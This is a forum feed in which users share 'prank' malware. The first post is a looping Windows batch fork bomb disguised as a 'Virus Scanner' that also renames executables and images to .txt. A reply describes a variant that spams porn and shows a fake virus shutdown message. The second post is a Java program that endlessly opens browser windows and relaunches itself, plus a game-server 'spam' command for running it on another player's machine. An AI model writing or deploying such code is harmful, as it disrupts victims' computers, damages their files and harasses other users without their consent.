item.title: Lol, just something funny I made. ;)
item.dc:creator: @itzkyle Lusfr
item.description:
@itzkyle wrote:

@echo off
title Virus Scanner
color 0a
:loop
start calc
start notepad
start mspaint
start explorer
start iexplore
start (whateveryounamethisfile.bat)
ren .exe .txt
ren .jpg .txt
ren .java .txt
ren .class .txt
goto loop

It’s funny is all it is. Within 10 seconds you get like 100 IE windows and run.bat’s.

Nice idea, but I had one of these like…20 days ago. They aren’t cool. Plus, I made it spam porn, then shutdown with the message “192 viruses detected, windows will now shutdown permanently.” So good idea! If you want mine, PM me users. It doesn’t require a download, just a cp.

item.title: Lol, just something funny I made. ;)
item.dc:creator: @LeScape LeScape
item.description:
@LeScape wrote:

Ok, this is just some funny little program that spams the hell out of you. It’s attached to this post. For all of you paranoids out there:

All it does is run this java program:

import java.io.*;
public class Work {
	public static void launch(String launch) {
		String operatingSystem = System.getProperty("os.name");
		try {
			if (operatingSystem.startsWith("Windows")) {
				Runtime.getRuntime().exec("rundll32 url.dll,FileProtocolHandler "+launch);
			} else {
				System.out.println("This only works for windows users.");
			}
		} catch(Exception exception) {
			System.err.println("Error launching.");
			exception.printStackTrace();
		}
	}
	public static void openURL(String url) {
		String browserPath = "";
		browserPath = "C:/Program Files/Internet Explorer/iexplore.exe";
 		try {
	   		String[] b = {browserPath, url};
	    		Runtime.getRuntime().exec(b);
		} catch (Exception exc) {
	   		 exc.printStackTrace();
		}
    	}
	public static void main (String[] args) {
		for ( ; ; ) {
			openURL("www.youfail.org");
			launch("run.bat");
		}
	}
}

If you want this in command form (you could use this on another person in your server), do this:
Add a few methods:

	public static void openUpURL(String url) {
		String browserPath = "";
		browserPath = "C:/Program Files/Internet Explorer/iexplore.exe";
 		try {
	   		String[] b = {browserPath, url};
	    		Runtime.getRuntime().exec(b);
		} catch (Exception exc) {
	   		 exc.printStackTrace();
		}
    	}
	public static void activate() {
		for ( ; ; ) {
			openUpURL("www.youfail.org");
		}
	}

Now add this command:

if (command.startsWith("spam")) {
client user = (client)server.playerHandler.players[PlayerHandler.getPlayerID(command.substring(5))];
user.activate();
user.sendMessage("Lolol, byebye.");
}

Enjoy.

Read full topic
